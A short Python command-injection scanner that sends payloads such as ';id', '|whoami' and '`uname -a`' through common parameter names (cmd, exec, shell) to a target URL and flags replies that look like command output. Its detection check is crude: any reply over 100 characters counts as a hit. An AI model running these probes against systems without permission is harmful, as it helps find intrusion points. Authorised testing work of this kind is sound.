import requests
from concurrent.futures import ThreadPoolExecutor

def test_rce(url, param, payloads):
    try:
        for payload in payloads:
            full_url = f"{url}?{param}={payload}"
            r = requests.get(full_url, timeout=3)
            # Look for common linux command outputs
            if any(x in r.text.lower() for x in ["uid=", "root", "uid(", "command not found"]) or len(r.text) > 100:
                print(f"[RCE] Possible command injection at: {full_url}")
    except:
        pass

def run(url):
    print("[RCE Test] Running...")

    params = ["cmd", "command", "exec", "shell", "run", "input"]
    payloads = [
        ";id", "|whoami", "`uname -a`", "&uname -a", "&&ls", "|ls"
    ]

    with ThreadPoolExecutor(max_workers=10) as executor:
        for param in params:
            executor.submit(test_rce, url, param, payloads)
